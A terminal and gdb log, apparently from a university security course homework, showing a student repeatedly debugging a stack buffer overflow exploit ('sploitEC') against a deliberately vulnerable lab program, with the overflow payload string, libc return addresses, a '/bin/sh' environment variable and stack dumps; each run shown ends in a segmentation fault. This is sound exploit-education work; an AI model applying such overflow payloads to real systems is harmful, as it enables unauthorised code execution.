student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
sploit0      sploit1    sploit2    sploit3    sploit4    sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1828 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (
    temp=0xbfffff73 "AAAAAAAAp&\345\267܄\004\b\305\377\377\277\200\232\353\267\320y\343\267\305\377\377\277\305\377\377\277\305\377\377\277") at target4.c:10
10	  strcpy(name, temp);
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffb1
(gdb) p/x getenv("thing")
$2 = 0xbfffffa2
(gdb) info frame
Stack level 0, frame at 0xbffffdd4:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffde0
 source language c.
 Arglist at 0xbffffdcc, args: 
    temp=0xbfffff73 "AAAAAAAAp&\345\267܄\004\b\305\377\377\277\200\232\353\267\320y\343\267\305\377\377\277\305\377\377\277\305\377\377\277"
 Locals at 0xbffffdcc, Previous frame's sp is 0xbffffdd4
 Saved registers:
  ebp at 0xbffffdcc, eip at 0xbffffdd0
(gdb) x/64x 0xbfffff73-128
0xbffffef3:	0x00000c00	0x0003e800	0x00000d00	0x0003e800
0xbfffff03:	0x00000e00	0x0003e800	0x00001700	0x00000100
0xbfffff13:	0x00001900	0xffff4b00	0x00001abf	0x00000000
0xbfffff23:	0x00001f00	0xffffef00	0x00000fbf	0xffff5b00
0xbfffff33:	0x000000bf	0x00000000	0x00000000	0x00000000
0xbfffff43:	0x00000000	0x00000000	0x7fb69c51	0xd72712bb
0xbfffff53:	0xd8edfb16	0xbf2f2e42	0x36383669	0x00000000
0xbfffff63:	0x2f000000	0x2f706d74	0x67726174	0x00347465
0xbfffff73:	0x41414141	0x41414141	0xb7e52670	0x080484dc
0xbfffff83:	0xbfffffc5	0xb7eb9a80	0xb7e379d0	0xbfffffc5
0xbfffff93:	0xbfffffc5	0xbfffffc5	0x69687400	0x253d676e
0xbfffffa3:	0x006e2435	0x6c656873	0x646f636c	0x622f3d65
0xbfffffb3:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffc3:	0x41003474	0x41414141	0x70414141	0xdcb7e526
0xbfffffd3:	0xc5080484	0x80bfffff	0xd0b7eb9a	0xc5b7e379
0xbfffffe3:	0xc5bfffff	0xc5bfffff	0x00bfffff	0x706d742f
(gdb) q
A debugging session is active.

	Inferior 1 [process 1828] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1873 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (
    temp=0xbfffff73 "AAAAAAAAp&\345\267܄\004\b\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\227\377\377\277") at target4.c:10
10	  strcpy(name, temp);
(gdb) stepi
0x080484a4	10	  strcpy(name, temp);
(gdb) stepi
0x080484a7	10	  strcpy(name, temp);
(gdb) stepi
0x080484a8	10	  strcpy(name, temp);
(gdb) display/i $pc
1: x/i $pc
=> 0x80484a8 <foo+13>:	call   0x8048360 <strcpy@plt>
(gdb) display/i $pc
2: x/i $pc
=> 0x80484a8 <foo+13>:	call   0x8048360 <strcpy@plt>
(gdb) stepi
0x08048360 in strcpy@plt ()
1: x/i $pc
=> 0x8048360 <strcpy@plt>:	jmp    *0x804a010
2: x/i $pc
=> 0x8048360 <strcpy@plt>:	jmp    *0x804a010
(gdb) stepi
0x08048366 in strcpy@plt ()
1: x/i $pc
=> 0x8048366 <strcpy@plt+6>:	push   $0x8
2: x/i $pc
=> 0x8048366 <strcpy@plt+6>:	push   $0x8
(gdb) stepi
0x0804836b in strcpy@plt ()
1: x/i $pc
=> 0x804836b <strcpy@plt+11>:	jmp    0x8048340
2: x/i $pc
=> 0x804836b <strcpy@plt+11>:	jmp    0x8048340
(gdb) stepi
0x08048340 in ?? ()
1: x/i $pc
=> 0x8048340:	pushl  0x804a004
2: x/i $pc
=> 0x8048340:	pushl  0x804a004
(gdb) stepi
0x08048346 in ?? ()
1: x/i $pc
=> 0x8048346:	jmp    *0x804a008
2: x/i $pc
=> 0x8048346:	jmp    *0x804a008
(gdb) stepi
_dl_runtime_resolve () at ../sysdeps/i386/dl-trampoline.S:35
35	../sysdeps/i386/dl-trampoline.S: No such file or directory.
1: x/i $pc
=> 0xb7ff0000 <_dl_runtime_resolve>:	push   %eax
2: x/i $pc
=> 0xb7ff0000 <_dl_runtime_resolve>:	push   %eax
(gdb) stepi
37	in ../sysdeps/i386/dl-trampoline.S
1: x/i $pc
=> 0xb7ff0001 <_dl_runtime_resolve+1>:	push   %ecx
2: x/i $pc
=> 0xb7ff0001 <_dl_runtime_resolve+1>:	push   %ecx
(gdb) stepi
39	in ../sysdeps/i386/dl-trampoline.S
1: x/i $pc
=> 0xb7ff0002 <_dl_runtime_resolve+2>:	push   %edx
2: x/i $pc
=> 0xb7ff0002 <_dl_runtime_resolve+2>:	push   %edx
(gdb) stepi
41	in ../sysdeps/i386/dl-trampoline.S
1: x/i $pc
=> 0xb7ff0003 <_dl_runtime_resolve+3>:	mov    0x10(%esp),%edx
2: x/i $pc
=> 0xb7ff0003 <_dl_runtime_resolve+3>:	mov    0x10(%esp),%edx
(gdb) stepi
42	in ../sysdeps/i386/dl-trampoline.S
1: x/i $pc
=> 0xb7ff0007 <_dl_runtime_resolve+7>:	mov    0xc(%esp),%eax
2: x/i $pc
=> 0xb7ff0007 <_dl_runtime_resolve+7>:	mov    0xc(%esp),%eax
(gdb) stepi
43	in ../sysdeps/i386/dl-trampoline.S
1: x/i $pc
=> 0xb7ff000b <_dl_runtime_resolve+11>:	call   0xb7fe97e0 <_dl_fixup>
2: x/i $pc
=> 0xb7ff000b <_dl_runtime_resolve+11>:	call   0xb7fe97e0 <_dl_fixup>
(gdb) stepi
_dl_fixup (l=0xb7fff918, reloc_arg=8) at dl-runtime.c:66
66	dl-runtime.c: No such file or directory.
1: x/i $pc
=> 0xb7fe97e0 <_dl_fixup>:	push   %ebp
2: x/i $pc
=> 0xb7fe97e0 <_dl_fixup>:	push   %ebp
(gdb) stepi
0xb7fe97e1	66	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97e1 <_dl_fixup+1>:	push   %edi
2: x/i $pc
=> 0xb7fe97e1 <_dl_fixup+1>:	push   %edi
(gdb) stepi
0xb7fe97e2	66	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97e2 <_dl_fixup+2>:	mov    %eax,%edi
2: x/i $pc
=> 0xb7fe97e2 <_dl_fixup+2>:	mov    %eax,%edi
(gdb) stepi
0xb7fe97e4	66	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97e4 <_dl_fixup+4>:	push   %esi
2: x/i $pc
=> 0xb7fe97e4 <_dl_fixup+4>:	push   %esi
(gdb) stepi
0xb7fe97e5	66	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97e5 <_dl_fixup+5>:	push   %ebx
2: x/i $pc
=> 0xb7fe97e5 <_dl_fixup+5>:	push   %ebx
(gdb) stepi
0xb7fe97e6	66	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97e6 <_dl_fixup+6>:	call   0xb7ff48ed <__x86.get_pc_thunk.si>
2: x/i $pc
=> 0xb7fe97e6 <_dl_fixup+6>:	call   0xb7ff48ed <__x86.get_pc_thunk.si>
(gdb) stepi
0xb7ff48ed in __x86.get_pc_thunk.si () from /lib/ld-linux.so.2
1: x/i $pc
=> 0xb7ff48ed <__x86.get_pc_thunk.si>:	mov    (%esp),%esi
2: x/i $pc
=> 0xb7ff48ed <__x86.get_pc_thunk.si>:	mov    (%esp),%esi
(gdb) stepi
0xb7ff48f0 in __x86.get_pc_thunk.si () from /lib/ld-linux.so.2
1: x/i $pc
=> 0xb7ff48f0 <__x86.get_pc_thunk.si+3>:	ret    
2: x/i $pc
=> 0xb7ff48f0 <__x86.get_pc_thunk.si+3>:	ret    
(gdb) stepi
0xb7fe97eb in _dl_fixup (l=0xb7fff918, reloc_arg=8) at dl-runtime.c:66
66	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97eb <_dl_fixup+11>:	add    $0x15815,%esi
2: x/i $pc
=> 0xb7fe97eb <_dl_fixup+11>:	add    $0x15815,%esi
(gdb) display/i $pc
3: x/i $pc
=> 0xb7fe97eb <_dl_fixup+11>:	add    $0x15815,%esi
(gdb) stepi
0xb7fe97f1	66	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97f1 <_dl_fixup+17>:	sub    $0x2c,%esp
2: x/i $pc
=> 0xb7fe97f1 <_dl_fixup+17>:	sub    $0x2c,%esp
3: x/i $pc
=> 0xb7fe97f1 <_dl_fixup+17>:	sub    $0x2c,%esp
(gdb) stepi
72	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97f4 <_dl_fixup+20>:	mov    0x7c(%edi),%ecx
2: x/i $pc
=> 0xb7fe97f4 <_dl_fixup+20>:	mov    0x7c(%edi),%ecx
3: x/i $pc
=> 0xb7fe97f4 <_dl_fixup+20>:	mov    0x7c(%edi),%ecx
(gdb) stepi
69	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97f7 <_dl_fixup+23>:	mov    0x34(%eax),%eax
2: x/i $pc
=> 0xb7fe97f7 <_dl_fixup+23>:	mov    0x34(%eax),%eax
3: x/i $pc
=> 0xb7fe97f7 <_dl_fixup+23>:	mov    0x34(%eax),%eax
(gdb) stepi
0xb7fe97fa	69	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97fa <_dl_fixup+26>:	mov    %esi,0x8(%esp)
2: x/i $pc
=> 0xb7fe97fa <_dl_fixup+26>:	mov    %esi,0x8(%esp)
3: x/i $pc
=> 0xb7fe97fa <_dl_fixup+26>:	mov    %esi,0x8(%esp)
(gdb) stepi
71	in dl-runtime.c
1: x/i $pc
=> 0xb7fe97fe <_dl_fixup+30>:	add    0x4(%ecx),%edx
2: x/i $pc
=> 0xb7fe97fe <_dl_fixup+30>:	add    0x4(%ecx),%edx
3: x/i $pc
=> 0xb7fe97fe <_dl_fixup+30>:	add    0x4(%ecx),%edx
(gdb) stepi
69	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9801 <_dl_fixup+33>:	mov    0x4(%eax),%eax
2: x/i $pc
=> 0xb7fe9801 <_dl_fixup+33>:	mov    0x4(%eax),%eax
3: x/i $pc
=> 0xb7fe9801 <_dl_fixup+33>:	mov    0x4(%eax),%eax
(gdb) stepi
68	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9804 <_dl_fixup+36>:	mov    0x38(%edi),%ecx
2: x/i $pc
=> 0xb7fe9804 <_dl_fixup+36>:	mov    0x38(%edi),%ecx
3: x/i $pc
=> 0xb7fe9804 <_dl_fixup+36>:	mov    0x38(%edi),%ecx
(gdb) stepi
69	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9807 <_dl_fixup+39>:	mov    %eax,0xc(%esp)
2: x/i $pc
=> 0xb7fe9807 <_dl_fixup+39>:	mov    %eax,0xc(%esp)
3: x/i $pc
=> 0xb7fe9807 <_dl_fixup+39>:	mov    %eax,0xc(%esp)
(gdb) stepi
71	in dl-runtime.c
1: x/i $pc
=> 0xb7fe980b <_dl_fixup+43>:	mov    %edx,%ebp
2: x/i $pc
=> 0xb7fe980b <_dl_fixup+43>:	mov    %edx,%ebp
3: x/i $pc
=> 0xb7fe980b <_dl_fixup+43>:	mov    %edx,%ebp
(gdb) stepi
73	in dl-runtime.c
1: x/i $pc
=> 0xb7fe980d <_dl_fixup+45>:	mov    0x4(%edx),%edx
2: x/i $pc
=> 0xb7fe980d <_dl_fixup+45>:	mov    0x4(%edx),%edx
3: x/i $pc
=> 0xb7fe980d <_dl_fixup+45>:	mov    0x4(%edx),%edx
(gdb) stepi
74	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9810 <_dl_fixup+48>:	mov    0x0(%ebp),%eax
2: x/i $pc
=> 0xb7fe9810 <_dl_fixup+48>:	mov    0x0(%ebp),%eax
3: x/i $pc
=> 0xb7fe9810 <_dl_fixup+48>:	mov    0x0(%ebp),%eax
(gdb) stepi
73	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9813 <_dl_fixup+51>:	mov    %edx,%esi
2: x/i $pc
=> 0xb7fe9813 <_dl_fixup+51>:	mov    %edx,%esi
3: x/i $pc
=> 0xb7fe9813 <_dl_fixup+51>:	mov    %edx,%esi
(gdb) stepi
0xb7fe9815	73	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9815 <_dl_fixup+53>:	shr    $0x8,%esi
2: x/i $pc
=> 0xb7fe9815 <_dl_fixup+53>:	shr    $0x8,%esi
3: x/i $pc
=> 0xb7fe9815 <_dl_fixup+53>:	shr    $0x8,%esi
(gdb) stepi
0xb7fe9818	73	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9818 <_dl_fixup+56>:	mov    %esi,%ebx
2: x/i $pc
=> 0xb7fe9818 <_dl_fixup+56>:	mov    %esi,%ebx
3: x/i $pc
=> 0xb7fe9818 <_dl_fixup+56>:	mov    %esi,%ebx
(gdb) stepi
0xb7fe981a	73	in dl-runtime.c
1: x/i $pc
=> 0xb7fe981a <_dl_fixup+58>:	shl    $0x4,%ebx
2: x/i $pc
=> 0xb7fe981a <_dl_fixup+58>:	shl    $0x4,%ebx
3: x/i $pc
=> 0xb7fe981a <_dl_fixup+58>:	shl    $0x4,%ebx
(gdb) stepi
0xb7fe981d	73	in dl-runtime.c
1: x/i $pc
=> 0xb7fe981d <_dl_fixup+61>:	add    0x4(%ecx),%ebx
2: x/i $pc
=> 0xb7fe981d <_dl_fixup+61>:	add    0x4(%ecx),%ebx
3: x/i $pc
=> 0xb7fe981d <_dl_fixup+61>:	add    0x4(%ecx),%ebx
(gdb) stepi
74	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9820 <_dl_fixup+64>:	mov    (%edi),%ecx
2: x/i $pc
=> 0xb7fe9820 <_dl_fixup+64>:	mov    (%edi),%ecx
3: x/i $pc
=> 0xb7fe9820 <_dl_fixup+64>:	mov    (%edi),%ecx
(gdb) stepi
0xb7fe9822	74	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9822 <_dl_fixup+66>:	add    %ecx,%eax
2: x/i $pc
=> 0xb7fe9822 <_dl_fixup+66>:	add    %ecx,%eax
3: x/i $pc
=> 0xb7fe9822 <_dl_fixup+66>:	add    %ecx,%eax
(gdb) stepi
79	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9824 <_dl_fixup+68>:	cmp    $0x7,%dl
2: x/i $pc
=> 0xb7fe9824 <_dl_fixup+68>:	cmp    $0x7,%dl
3: x/i $pc
=> 0xb7fe9824 <_dl_fixup+68>:	cmp    $0x7,%dl
(gdb) stepi
73	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9827 <_dl_fixup+71>:	mov    %ebx,0x1c(%esp)
2: x/i $pc
=> 0xb7fe9827 <_dl_fixup+71>:	mov    %ebx,0x1c(%esp)
3: x/i $pc
=> 0xb7fe9827 <_dl_fixup+71>:	mov    %ebx,0x1c(%esp)
(gdb) stepi
79	in dl-runtime.c
1: x/i $pc
=> 0xb7fe982b <_dl_fixup+75>:	jne    0xb7fe996f <_dl_fixup+399>
2: x/i $pc
=> 0xb7fe982b <_dl_fixup+75>:	jne    0xb7fe996f <_dl_fixup+399>
3: x/i $pc
=> 0xb7fe982b <_dl_fixup+75>:	jne    0xb7fe996f <_dl_fixup+399>
(gdb) stepi
83	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9831 <_dl_fixup+81>:	testb  $0x3,0xd(%ebx)
2: x/i $pc
=> 0xb7fe9831 <_dl_fixup+81>:	testb  $0x3,0xd(%ebx)
3: x/i $pc
=> 0xb7fe9831 <_dl_fixup+81>:	testb  $0x3,0xd(%ebx)
(gdb) stepi
0xb7fe9835	83	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9835 <_dl_fixup+85>:	mov    %eax,%ebp
2: x/i $pc
=> 0xb7fe9835 <_dl_fixup+85>:	mov    %eax,%ebp
3: x/i $pc
=> 0xb7fe9835 <_dl_fixup+85>:	mov    %eax,%ebp
(gdb) stepi
0xb7fe9837	83	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9837 <_dl_fixup+87>:	jne    0xb7fe9910 <_dl_fixup+304>
2: x/i $pc
=> 0xb7fe9837 <_dl_fixup+87>:	jne    0xb7fe9910 <_dl_fixup+304>
3: x/i $pc
=> 0xb7fe9837 <_dl_fixup+87>:	jne    0xb7fe9910 <_dl_fixup+304>
(gdb) stepi
87	in dl-runtime.c
1: x/i $pc
=> 0xb7fe983d <_dl_fixup+93>:	mov    0xe4(%edi),%edx
2: x/i $pc
=> 0xb7fe983d <_dl_fixup+93>:	mov    0xe4(%edi),%edx
3: x/i $pc
=> 0xb7fe983d <_dl_fixup+93>:	mov    0xe4(%edi),%edx
(gdb) stepi
0xb7fe9843	87	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9843 <_dl_fixup+99>:	test   %edx,%edx
2: x/i $pc
=> 0xb7fe9843 <_dl_fixup+99>:	test   %edx,%edx
3: x/i $pc
=> 0xb7fe9843 <_dl_fixup+99>:	test   %edx,%edx
(gdb) stepi
0xb7fe9845	87	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9845 <_dl_fixup+101>:	je     0xb7fe98f0 <_dl_fixup+272>
2: x/i $pc
=> 0xb7fe9845 <_dl_fixup+101>:	je     0xb7fe98f0 <_dl_fixup+272>
3: x/i $pc
=> 0xb7fe9845 <_dl_fixup+101>:	je     0xb7fe98f0 <_dl_fixup+272>
(gdb) stepi
91	in dl-runtime.c
1: x/i $pc
=> 0xb7fe984b <_dl_fixup+107>:	mov    0x4(%edx),%edx
2: x/i $pc
=> 0xb7fe984b <_dl_fixup+107>:	mov    0x4(%edx),%edx
3: x/i $pc
=> 0xb7fe984b <_dl_fixup+107>:	mov    0x4(%edx),%edx
(gdb) stepi
92	in dl-runtime.c
1: x/i $pc
=> 0xb7fe984e <_dl_fixup+110>:	movzwl (%edx,%esi,2),%edx
2: x/i $pc
=> 0xb7fe984e <_dl_fixup+110>:	movzwl (%edx,%esi,2),%edx
3: x/i $pc
=> 0xb7fe984e <_dl_fixup+110>:	movzwl (%edx,%esi,2),%edx
(gdb) stepi
0xb7fe9852	92	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9852 <_dl_fixup+114>:	and    $0x7fff,%edx
2: x/i $pc
=> 0xb7fe9852 <_dl_fixup+114>:	and    $0x7fff,%edx
3: x/i $pc
=> 0xb7fe9852 <_dl_fixup+114>:	and    $0x7fff,%edx
(gdb) stepi
0xb7fe9858	92	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9858 <_dl_fixup+120>:	shl    $0x4,%edx
2: x/i $pc
=> 0xb7fe9858 <_dl_fixup+120>:	shl    $0x4,%edx
3: x/i $pc
=> 0xb7fe9858 <_dl_fixup+120>:	shl    $0x4,%edx
(gdb) stepi
0xb7fe985b	92	in dl-runtime.c
1: x/i $pc
=> 0xb7fe985b <_dl_fixup+123>:	add    0x170(%edi),%edx
2: x/i $pc
=> 0xb7fe985b <_dl_fixup+123>:	add    0x170(%edi),%edx
3: x/i $pc
=> 0xb7fe985b <_dl_fixup+123>:	add    0x170(%edi),%edx
(gdb) stepi
94	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9861 <_dl_fixup+129>:	mov    0x4(%edx),%ecx
2: x/i $pc
=> 0xb7fe9861 <_dl_fixup+129>:	mov    0x4(%edx),%ecx
3: x/i $pc
=> 0xb7fe9861 <_dl_fixup+129>:	mov    0x4(%edx),%ecx
(gdb) stepi
0xb7fe9864	94	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9864 <_dl_fixup+132>:	test   %ecx,%ecx
2: x/i $pc
=> 0xb7fe9864 <_dl_fixup+132>:	test   %ecx,%ecx
3: x/i $pc
=> 0xb7fe9864 <_dl_fixup+132>:	test   %ecx,%ecx
(gdb) stepi
0xb7fe9866	94	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9866 <_dl_fixup+134>:	mov    $0x0,%ecx
2: x/i $pc
=> 0xb7fe9866 <_dl_fixup+134>:	mov    $0x0,%ecx
3: x/i $pc
=> 0xb7fe9866 <_dl_fixup+134>:	mov    $0x0,%ecx
(gdb) stepi
0xb7fe986b	94	in dl-runtime.c
1: x/i $pc
=> 0xb7fe986b <_dl_fixup+139>:	cmove  %ecx,%edx
2: x/i $pc
=> 0xb7fe986b <_dl_fixup+139>:	cmove  %ecx,%edx
3: x/i $pc
=> 0xb7fe986b <_dl_fixup+139>:	cmove  %ecx,%edx
(gdb) stepi
101	in dl-runtime.c
1: x/i $pc
=> 0xb7fe986e <_dl_fixup+142>:	mov    %gs:0xc,%ecx
2: x/i $pc
=> 0xb7fe986e <_dl_fixup+142>:	mov    %gs:0xc,%ecx
3: x/i $pc
=> 0xb7fe986e <_dl_fixup+142>:	mov    %gs:0xc,%ecx
(gdb) stepi
0xb7fe9875	101	in dl-runtime.c
1: x/i $pc
=> 0xb7fe9875 <_dl_fixup+149>:	test   %ecx,%ecx
2: x/i $pc
=> 0xb7fe9875 <_dl_fixup+149>:	test   %ecx,%ecx
3: x/i $pc
=> 0xb7fe9875 <_dl_fixup+149>:	test   %ecx,%ecx
(gdb) q
A debugging session is active.

	Inferior 1 [process 1873] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1919 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (
    temp=0xbfffff73 "AAAAAAAAp&\345\267\360H\377\267\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\227\377\377\277") at target4.c:10
10	  strcpy(name, temp);
(gdb) info frame
Stack level 0, frame at 0xbffffdd4:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffde0
 source language c.
 Arglist at 0xbffffdcc, args: 
    temp=0xbfffff73 "AAAAAAAAp&\345\267\360H\377\267\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\227\377\377\277"
 Locals at 0xbffffdcc, Previous frame's sp is 0xbffffdd4
 Saved registers:
  ebp at 0xbffffdcc, eip at 0xbffffdd0
(gdb) x/64x 0xbffffdcc-128
0xbffffd4c:	0xb7e996bb	0xbffffd7e	0xbffffe80	0x000000e0
0xbffffd5c:	0x00000000	0xb7fff000	0xb7fff918	0xbffffd80
0xbffffd6c:	0x08048284	0x00000000	0xbffffe14	0xb7fbb000
0xbffffd7c:	0x0000ff17	0xffffffff	0x0000002f	0xb7e15dc8
0xbffffd8c:	0xb7fd51b0	0x00008000	0xb7fbb000	0xb7fb9244
0xbffffd9c:	0xb7e210ec	0x00000002	0x00000000	0xb7e37a50
0xbffffdac:	0x0804854b	0x00000002	0xbffffe74	0xbffffe80
0xbffffdbc:	0x08048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffdcc:	0xbffffdd8	0x080484e8	0xbfffff73	0x00000000
0xbffffddc:	0xb7e21637	0x00000002	0xbffffe74	0xbffffe80
0xbffffdec:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffdfc:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe0c:	0xb7fbb000	0x00000000	0x651aa95c	0x5eca874c
0xbffffe1c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe2c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe3c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) n
11	}
(gdb) x/64x 0xbffffdcc-128
0xbffffd4c:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffd5c:	0x00000000	0xb7e7df95	0xb7fe996a	0xbffffd80
0xbffffd6c:	0x08048284	0xb7fff000	0x08048250	0xb7fbb000
0xbffffd7c:	0x0000ff17	0xffffffff	0xb7e0d598	0xb7e15dc8
0xbffffd8c:	0xb7fd51b0	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd9c:	0xb7fbb000	0xbffffdcc	0xb7ff0010	0xbffffe04
0xbffffdac:	0xb7e8fe10	0xbffffdc8	0x00000000	0xb7fbb000
0xbffffdbc:	0x080484ad	0xbffffdc8	0xbfffff73	0x41414141
0xbffffdcc:	0x41414141	0xb7e52670	0xb7ff48f0	0xbfffffa2
0xbffffddc:	0xb7eb9a80	0xb7e379d0	0xbfffffb1	0xbfffffb1
0xbffffdec:	0xbfffff97	0x00000000	0x00000000	0xb7fbb000
0xbffffdfc:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe0c:	0xb7fbb000	0x00000000	0x651aa95c	0x5eca874c
0xbffffe1c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe2c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe3c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1919] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1987 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (
    temp=0xbfffff73 "AAAAAAAAp&\345\267\360H\377\267\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\354\375\377\277") at target4.c:10
10	  strcpy(name, temp);
(gdb) info frame
Stack level 0, frame at 0xbffffdd4:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffde0
 source language c.
